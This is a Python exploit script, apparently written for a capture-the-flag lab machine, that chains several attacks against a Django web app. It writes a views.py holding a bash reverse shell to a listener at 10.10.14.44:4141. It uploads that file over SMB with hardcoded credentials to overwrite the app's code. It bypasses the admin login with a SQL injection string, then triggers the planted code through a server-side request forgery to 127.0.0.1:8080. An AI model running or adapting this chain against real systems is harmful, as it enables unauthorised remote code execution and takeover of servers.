#! /usr/bin/python3

import requests as r
from smb.SMBConnection import SMBConnection

#create temp file with shell content
def create_file():
    f = open("/tmp/views.py", "w")
    lhost = "10.10.14.44"  # changeme
    lport = 4141
    views_py = f"""
from django.shortcuts import render
from django.views.generic import TemplateView
import os

def home_page(request):
    os.system('/bin/bash -c "/bin/bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"')
    template_name = "index.html"
    return render(request,template_name)
"""
    f.write(views_py)
    f.close()

#upload/replace "views.py" from smb share
def smb_put():
    conn = SMBConnection('kyle', 'ToughPasswordToCrack', 'test_v1', 'v1', use_ntlm_v2=True)
    assert conn.connect('10.10.11.101', 139)
    with open('/tmp/views.py', 'rb') as file_obj:
        conn.storeFile('writer2_project', '/writer_web/views.py', file_obj)
    file_obj.close()

#invoke localhost dev webapp via ssrf
def ssrf():
    s = r.session()
    url = 'http://10.10.11.101'
    s.post(f"{url}/administrative", data="uname=test'+OR+1=1;--+-&password=test", headers={"Content-Type": "application/x-www-form-urlencoded"})
    header = {"Content-Type": "multipart/form-data; boundary=---------------------------40554192439809207943475147343"}
    data = """-----------------------------40554192439809207943475147343\r\nContent-Disposition: form-data; name="author"\r\n\r\ntest\r\n-----------------------------40554192439809207943475147343\r\nContent-Disposition: form-data; name="title"\r\n\r\ntest\r\n-----------------------------40554192439809207943475147343\r\nContent-Disposition: form-data; name="tagline"\r\n\r\ntestAnd\r\n-----------------------------40554192439809207943475147343\r\nContent-Disposition: form-data; name="image"; filename=""\r\nContent-Type: application/octet-stream\r\n\r\n\r\n-----------------------------40554192439809207943475147343\r\nContent-Disposition: form-data; name="image_url"\r\n\r\nhttp://127.0.0.1:8080/#.jpg\r\n-----------------------------40554192439809207943475147343\r\nContent-Disposition: form-data; name="content"\r\n\r\ntest\r\n-----------------------------40554192439809207943475147343--\r\n"""
    s.post(f"{url}/dashboard/stories/add", headers=header, data=data)
    s.close()

create_file()
smb_put()
ssrf()